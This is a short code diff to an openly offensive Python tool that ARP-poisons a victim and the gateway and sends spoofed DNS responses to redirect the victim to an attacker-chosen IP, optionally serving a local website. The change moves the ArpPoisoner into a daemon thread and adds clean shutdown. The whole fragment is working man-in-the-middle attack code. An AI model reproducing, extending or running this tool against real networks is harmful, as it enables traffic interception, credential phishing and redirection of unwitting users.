@@ -14,6 +14,7 @@ def run(args):
     interface = args.interface
     victim_ip = args.victim_ip
     route_to_local = spoof_ip == get_if_addr(interface)
+
     # Spoof the gateway router
     gateway_ip = get_gateway_ip.find_gateway_ip()
     args.gateway_ip = gateway_ip
@@ -48,11 +49,12 @@ def run(args):
                 print("Sent spoofed DNS response for {} to {}".format(dns_req, spoof_ip))
 
     try:
-        #arp_poison_thread = threading.Thread(target=arp_poison_run, args=(args, stop_event))
-        #arp_poison_thread.setDaemon(True)
-        #arp_poison_thread.start()
+
         poisoner = ArpPoisoner(args)
-        poisoner.start()
+        arp_poison_thread = threading.Thread(target=poisoner.start)
+        arp_poison_thread.setDaemon(True)
+        arp_poison_thread.start()
+
         if (route_to_local):
 
             print("Spoof IP is the same as the attacker's IP. Loading up website...")
@@ -69,7 +71,8 @@ def run(args):
     except (KeyboardInterrupt, SystemExit):
         print("Interrupted, joining threads...")
         stop_event.set()
-        #arp_poison_thread.join()
+        poisoner.stop()
+        arp_poison_thread.join()
         if (route_to_local):
             
             website_thread.join()
